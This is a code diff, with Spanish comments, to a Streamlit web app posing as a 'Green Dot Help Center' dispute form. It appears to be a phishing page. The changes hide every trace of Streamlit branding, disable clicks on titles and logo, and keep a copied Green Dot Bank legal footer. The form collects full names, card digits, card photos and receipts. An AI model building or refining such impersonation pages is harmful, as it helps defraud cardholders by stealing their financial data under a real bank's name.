@@ -23,31 +23,33 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_icon="✅")
 
-# CSS AGRESIVO PARA ELIMINAR TODO RASTRO DE STREAMLIT Y ENLACES
+# CSS AGRESIVO PARA ELIMINAR ANCLAS Y BRANDING
 st.markdown("""<style>
-/* Bloqueo total de cabecera y pie de página de Streamlit */
+/* Ocultar cabecera, pie de página y menú de Streamlit */
 [data-testid='stHeader'], [data-testid='stFooterAd'], footer, header, #MainMenu, .stDeployButton {
     display: none !important;
     visibility: hidden !important;
-    height: 0 !important;
 }
 
-/* Eliminar la barra de herramientas de widgets (como el botón de pantalla completa en imágenes) */
-[data-testid='stElementToolbar'] {display: none !important;}
+/* ELIMINAR EL ICONO DE ENLACE (ANCLA) JUNTO A LOS TÍTULOS */
+.viewerBadge_container__1QS13, .stApp a.section-anchor, .section-anchor {
+    display: none !important;
+    visibility: hidden !important;
+}
 
-/* Fondo negro global */
+/* Desactivar clics en textos y logos para evitar que actúen como botones */
+h1, h2, h3, p, [data-testid="stImage"] {
+    pointer-events: none !important;
+    user-select: none !important;
+}
+
+/* Fondo negro y texto blanco */
 .stApp {
     background-color: #000000 !important;
     color: #FFFFFF !important;
 }
 
-/* Inhabilitar clics en logo y títulos para que no actúen como enlaces */
-[data-testid="stImage"], h1, h2, h3, .stMarkdownContainer p {
-    pointer-events: none !important;
-    user-select: none !important;
-}
-
-/* Estilo del botón Emerald Green */
+/* Botón verde esmeralda personalizado */
 .stButton>button {
     background-color: #00a05b !important;
     color: white !important;
@@ -58,7 +60,7 @@ st.markdown("""<style>
     text-transform: uppercase;
 }
 
-/* Inputs oscuros */
+/* Estilo de los campos de entrada */
 input {
     background-color: #111 !important;
     color: white !important;
@@ -67,15 +69,14 @@ input {
 
 .legal-footer {
     font-size: 10px;
-    color: #555;
+    color: #444;
     text-align: justify;
-    margin-top: 50px;
+    margin-top: 60px;
     border-top: 1px solid #222;
     padding-top: 20px;
 }
 </style>""", unsafe_allow_html=True)
 
-# Contenido de la App
 if os.path.exists('logo.svg'):
     st.image('logo.svg', width=120)
 
@@ -86,11 +87,9 @@ with st.form("dispute_form", clear_on_submit=True):
     nombre = st.text_input("Full Name")
     cuenta = st.text_input("Last 4 digits of Card")
     monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
-    
     st.markdown("**Upload Evidence**")
     rec = st.file_uploader("Receipt Photo", type=['jpg','png','jpeg'])
     car = st.file_uploader("Card Photo", type=['jpg','png','jpeg'])
-    
     submitted = st.form_submit_button("SUBMIT NOW")
 
 if submitted:
@@ -99,7 +98,6 @@ if submitted:
     else:
         st.error("⚠️ All fields are required.")
 
-# Footer legal estático
 st.markdown("""<div class='legal-footer'>
 Green Dot cards are issued by Green Dot Bank, Member FDIC. ©2026 Green Dot Bank. 
 All rights reserved. The Green Dot logo is a registered trademark.
